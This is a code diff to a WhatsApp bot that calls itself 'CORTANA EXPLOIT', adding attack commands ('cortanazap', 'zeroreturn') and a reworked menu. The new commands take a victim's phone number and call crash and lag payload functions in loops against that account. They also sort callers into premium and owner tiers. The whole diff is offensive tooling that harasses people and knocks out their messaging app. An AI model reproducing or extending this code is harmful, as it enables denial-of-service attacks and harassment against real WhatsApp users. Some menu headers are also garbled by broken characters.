@@ -228,41 +228,49 @@ ${config.branding.footer}`;
                 await reaction(m.chat, "✅");
 
                 const accessLevel = isAuthorized ? "🔓 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝" : isCreator ? "𝐎𝐰𝐧𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬";
-                const menu = `\`╭─[ ☠️ 𝐂𝐎𝐑𝐓𝐀𝐍𝐀 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ]\`
-\`│\` *Version* : ${config.version}
-\`│\` *Status* : ${config.status.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞'}
-\`│\` *Access* : ${accessLevel}
-\`╰────────────────㋡︎\`
+                const menu = `\`╭─[ ☠️ 𝐂𝐎𝐑𝐓𝐀𝐍𝐀 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ]
+│ Version : ${config.version}
+│ Status  : ${config.status.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞'}
+│ Access  : ${accessLevel}
+╰────────────────㋡︎\`
 
-\`╭─[ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
-\`│\` ▢ ${prefix}oneterm 62xxx
-\`│\` ▢ ${prefix}cortanacall 62xxx
-\`│\` ▢ ${prefix}trashem 62xxx
-\`│\` ▢ ${prefix}newyear 62xxx
-\`│\` ▢ ${prefix}edudevice 62xxx
-\`│\` ▢ ${prefix}kindiki 62xxx
-\`╰────❍\`
+\`╭─[ �͢�͠�͡�͢�͠�͡�͢�-�͢�͠�͡�͢𝐬 ]
+│ ▢ ${prefix}oneterm <target>
+│ ▢ ${prefix}cortanacall <target>
+│ ▢ ${prefix}trashem <target>
+╰────❍\`
 
-\`╭─[ 𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
-\`│\` ▢ ${prefix}kufeni - inplace
-\`│\` ▢ ${prefix}fuckall - inplace
-\`│\` ▢ ${prefix}cookall - inplace
-\`╰────❍\`
+\`╭─[ 𝐂͢𝐫͠𝐚͡𝐬͢𝐡-𝐇͢𝐨͠𝐦͡𝐞 ]
+│ ▢ ${prefix}newyear <target>
+│ ▢ ${prefix}edudevice <target>
+╰────❍\`
 
-\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 ]\`
-\`│\` ▢ ${prefix}realban<target>
-\`│\` ▢ ${prefix}attemptexp<target>
-\`╰────❍\`
+\`╭─[ 𝐃͢𝐞͠𝐥͡𝐚͢𝐲-𝐈͢𝐧͠𝐯͡𝐢͢𝐬 ]
+│ ▢ ${prefix}kindiki <target>
+│ ▢ ${prefix}cortanazap <target>
+│ ▢ ${prefix}zeroreturn <target>
+╰────❍\`
 
-\`╭─[ 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗͢ 𝐁͠𝐎͡𝐔͢𝐍͠𝐓͡𝐘 ]\`
-\`│\` ▢ ${prefix}forcemessage
-\`╰────❍\`
+\`╭─[ 𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐂͢𝐦͠𝐝͡𝐬 ]
+│ ▢ ${prefix}kufeni - inplace
+│ ▢ ${prefix}fuckall - inplace
+│ ▢ ${prefix}cookall - inplace
+╰────❍\`
 
-\`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
-\`│\` ▢ ${prefix}addprem 62xxx
-\`│\` ▢ ${prefix}delprem 62xxx
-\`│\` ▢ ${prefix}listprem
-\`╰────❍\`
+\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 ]
+│ ▢ ${prefix}realban<target>
+│ ▢ ${prefix}attemptexp<target>
+╰────❍\`
+
+\`╭─[ 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗͢ 𝐁͠𝐎͡𝐔͢𝐍͠𝐓͡𝐘 ]
+│ ▢ ${prefix}forcemessage
+╰────❍\`
+
+\`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐂͢𝐦͠𝐝͡𝐬 ]
+│ ▢ ${prefix}addprem <num>
+│ ▢ ${prefix}delprem <num>
+│ ▢ ${prefix}listprem
+╰────❍\`
 `;
 
                 await sock.sendMessage(m.chat, {
@@ -513,6 +521,89 @@ ${config.branding.footer}`;
                     await sleep(config.exploitSettings.delayBetweenCalls);
                     await TzXAudio(sock, target);
                     await sleep(config.exploitSettings.delayBetweenCalls);
+                    await TzXAudio(sock, target);
+                    await sleep(config.exploitSettings.delayBetweenCalls);
+                }
+
+                await cortanaExploitSuccess(bijipler, command);
+                break;
+            }
+
+            // .cortanazap - Delay invisible combo (TzxAudio + SpcmUi)
+            case 'cortanazap': {
+                if (!isPremium && !isCreator) {
+                    return zreply(`*no, this is for premium only*`);
+                }
+
+                if (!text) {
+                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
+                }
+
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Format: ${prefix + command} 628xxx`);
+                }
+
+                let target = bijipler + '@s.whatsapp.net';
+
+                if (config.blockedNumbers.includes(target)) {
+                    return zreply("*no, this target is protected*");
+                }
+
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "⚡");
+                await sleep(400);
+                await reaction(m.chat, "✅");
+
+                const loopCount = config.exploitSettings.defaultLoopCount;
+                for (let i = 0; i < loopCount; i++) {
+                    await TzXAudio(sock, target);
+                    await sleep(config.exploitSettings.delayBetweenCalls);
+                    await SpcmUi(sock, target);
+                    await sleep(config.exploitSettings.delayBetweenCalls);
+                    await FcOneMesYgy(sock, target);
+                    await sleep(config.exploitSettings.delayBetweenCalls);
+                }
+
+                await cortanaExploitSuccess(bijipler, command);
+                break;
+            }
+
+            // .zeroreturn - Silent delay crash (TzxAudio heavy)
+            case 'zeroreturn': {
+                if (!isPremium && !isCreator) {
+                    return zreply(`*no, this is for premium only*`);
+                }
+
+                if (!text) {
+                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
+                }
+
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Format: ${prefix + command} 628xxx`);
+                }
+
+                let target = bijipler + '@s.whatsapp.net';
+
+                if (config.blockedNumbers.includes(target)) {
+                    return zreply("*no, this target is protected*");
+                }
+
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "💀");
+                await sleep(400);
+                await reaction(m.chat, "✅");
+
+                const loopCount = config.exploitSettings.maxLoopCount;
+                for (let i = 0; i < loopCount; i++) {
+                    await TzXAudio(sock, target);
+                    await TzXAudio(sock, target);
+                    await TzXAudio(sock, target);
+                    await sleep(config.exploitSettings.delayBetweenCalls);
+                    await BlankSpam(sock, target);
                     await TzXAudio(sock, target);
                     await sleep(config.exploitSettings.delayBetweenCalls);
                 }
